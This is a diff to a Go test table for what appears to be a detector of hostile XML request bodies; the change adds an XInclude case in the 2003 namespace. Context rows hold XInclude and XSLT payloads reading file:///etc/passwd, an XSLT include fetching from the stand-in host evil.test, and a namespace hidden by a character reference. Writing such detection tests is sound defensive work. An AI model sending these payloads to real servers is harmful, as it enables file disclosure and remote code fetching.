@@ -71,6 +71,7 @@ var xmlRows = register("xml", []row{
 	// XInclude, XSLT, processing instructions.
 	{name: "xinclude", ct: "application/xml", body: `<a xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></a>`, want: idXMLXInclude},
 	{name: "xinclude by default namespace", ct: "application/xml", body: `<include xmlns="http://www.w3.org/2001/XInclude" href="x"/>`, want: idXMLXInclude},
+	{name: "xinclude in the 2003 namespace libxml2 still processes", ct: "application/xml", body: `<a xmlns:xi="http://www.w3.org/2003/XInclude"><xi:include parse="text" href="x"/></a>`, want: idXMLXInclude},
 	{name: "xinclude namespace hidden by a character reference", ct: "application/xml", body: `<a xmlns:xi="&#104;ttp://www.w3.org/2001/XInclude"><xi:include href="x"/></a>`, want: idXMLXInclude},
 	{name: "xslt include", ct: "application/xml", body: `<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:include href="http://evil.test/x.xsl"/></xsl:stylesheet>`, want: idXMLXSLT},
 	{name: "xslt import", ct: "application/xml", body: `<s xmlns:x="http://www.w3.org/1999/XSL/Transform"><x:import href="file:///etc/passwd"/></s>`, want: idXMLXSLT},
